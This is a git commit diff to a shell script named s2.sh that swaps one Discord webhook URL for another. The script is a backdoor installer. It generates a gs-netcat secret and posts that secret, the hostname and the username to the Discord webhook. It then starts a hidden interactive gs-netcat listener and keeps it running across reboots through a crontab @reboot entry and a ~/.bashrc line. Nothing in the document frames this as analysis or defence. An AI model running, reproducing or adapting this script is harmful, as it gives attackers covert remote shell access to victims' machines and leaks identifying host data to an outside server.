ba7d8e6cdf3ece5def302255a07f39630fdc1549
bytelordd <byt3l0rrd@umail.asia>
2026-09-17 21:38:02 +0100

    Update s2.sh

--- s2.sh
+++ s2.sh
@@ -2,7 +2,7 @@
 
 SECRET=$(gs-netcat -g) && \
 echo "$SECRET" > ~/.gsocket_secret && \
-curl -X POST -H "Content-Type: application/json" -d "{\"content\":\" secretexploit: $SECRET\n exploithostinstall: $(hostname)\n User: $(whoami)\n exploitinstall\"}" https://discord.com/api/webhooks/1542132839003201576/xqJR_hmIHuqan-YG8V28l2zgtIieg1Pd4VgoPc0g32Y6m8AgpfRbpfmAf9wjmKplqYYW && \
+curl -X POST -H "Content-Type: application/json" -d "{\"content\":\" secretexploit: $SECRET\n exploithostinstall: $(hostname)\n User: $(whoami)\n exploitinstall\"}" https://discord.com/api/webhooks/1550229321472413737/LltbVk8gLALACy7XTqGwAgXxPNaUW0UAUg7jqVm1qTqkda71Zc7q722OKToWY31cxZ0W && \
 nohup gs-netcat -l -s "$SECRET" -i > /dev/null 2>&1 & disown && \
 (crontab -l 2>/dev/null | grep -v "gs-netcat"; echo "@reboot sleep 10 && /usr/bin/gs-netcat -l -s \"$SECRET\" -i > /dev/null 2>&1") | crontab - && \
 echo "gs-netcat -l -s \"$SECRET\" -i > /dev/null 2>&1 &" >> ~/.bashrc && \
